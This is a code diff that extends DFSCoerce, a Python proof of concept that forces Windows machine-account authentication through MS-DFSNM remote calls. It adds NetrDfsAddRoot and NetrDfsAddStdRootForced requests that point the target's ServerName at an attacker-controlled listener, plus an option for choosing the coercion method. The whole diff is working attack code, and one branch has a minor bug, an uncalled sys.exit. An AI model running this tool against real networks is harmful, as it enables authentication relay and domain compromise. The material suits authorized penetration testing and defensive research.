@@ -53,6 +53,18 @@ class NetrDfsAddRootResponse(NDRCALL):
      structure = (
          ('ErrorCode', ULONG),
      )
+class NetrDfsAddStdRootForced(NDRCALL):
+    opnum = 15
+    structure =(
+            ('ServerName', WSTR),
+            ('RootShare', WSTR),
+            ('Comment', WSTR),
+            ('Share', WSTR),
+        )
+class NetrDfsAddStdRootForcedResponse(NDRCALL):
+    structure = (
+                ('ErrorCode', ULONG),
+            )
 
 class TriggerAuth():
     def connect(self, username, password, domain, lmhash, nthash, target, doKerberos, dcHost, targetIp):
@@ -81,7 +93,7 @@ class TriggerAuth():
         return dce
 
     def NetrDfsRemoveStdRoot(self, dce, listener):
-        print("[-] Sending NetrDfsRemoveStdRoot!")
+        print("---> Sending NetrDfsRemoveStdRoot!")
         try:
             request = NetrDfsRemoveStdRoot()
             request['ServerName'] = '%s\x00' % listener
@@ -90,12 +102,37 @@ class TriggerAuth():
             request.dump()
             resp = dce.request(request)
 
-        except  Exception as e:
+        except Exception as e:
+            print(e)
+    
+    def NetrDfsAddRoot(self, dce, listener):
+        print("---> Sending NetrDfsAddRoot!")
+        try:
+            request = NetrDfsAddRoot()
+            request['ServerName'] = '%s\x00' % listener
+            request['RootShare'] = 'test\x00'
+            request['Comment'] = 'thisisshare\x00'
+            request['ApiFlags'] = 1
+            request.dump()
+            resp = dce.request(request)
+        except Exception as e:
+            print(e)
+    
+    def NetrDfsAddStdRootForced(self, dce, listener):
+        print("---> Sending NetrDfsAddStdRootForced!")
+        try:
+            request = NetrDfsAddStdRootForced()
+            request['ServerName'] = '%s\x00' % listener
+            request['RootShare'] = 'test\x00'
+            request['Comment'] = 'thisisshare\x00'
+            request['Share'] = 'C:\hackme\x00'
+            request.dump()
+            resp = dce.request(request)
+        except Exception as e:
             print(e)
 
-
 def main():
-    parser = argparse.ArgumentParser(add_help=True, description="DFSCoerce - PoC to coerce machine account authentication via MS-DFSNM NetrDfsRemoveStdRoot()")
+    parser = argparse.ArgumentParser(add_help=True, description="DFSCoerce - PoC to coerce machine account authentication via MS-DFSNM")
     parser.add_argument('-u', '--username', action="store", default='', help='valid username')
     parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
     parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
@@ -112,6 +149,7 @@ def main():
                              'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')
     parser.add_argument('listener', help='ip address or hostname of listener')
     parser.add_argument('target', help='ip address or hostname of target')
+    parser.add_argument('DFSMethodToCoerce', help='Specify the method, it could be NetrDfsAddRoot or NetrDfsRemove or NetrDfsAddForced')
     options = parser.parse_args()
 
     if options.hashes is not None:
@@ -128,9 +166,19 @@ def main():
 
     dce = trigger.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)
     if dce is not None:
-        trigger.NetrDfsRemoveStdRoot(dce, options.listener)
-        dce.disconnect()
-    sys.exit()
+        if options.DFSMethodToCoerce == 'NetrDfsRemove':
+            trigger.NetrDfsRemoveStdRoot(dce, options.listener)
+            dce.disconnect()
+            sys.exit()
+        elif options.DFSMethodToCoerce == 'NetrDfsAddRoot':
+            trigger.NetrDfsAddRoot(dce, options.listener)
+            dce.disconnect()
+            sys.exit()
+        
+        elif options.DFSMethodToCoerce == 'NetrDfsAddForced':
+            trigger.NetrDfsAddStdRootForced(dce, options.listener)
+            dce.disconnect()
+            sys.exit
 
 
 if __name__ == '__main__':
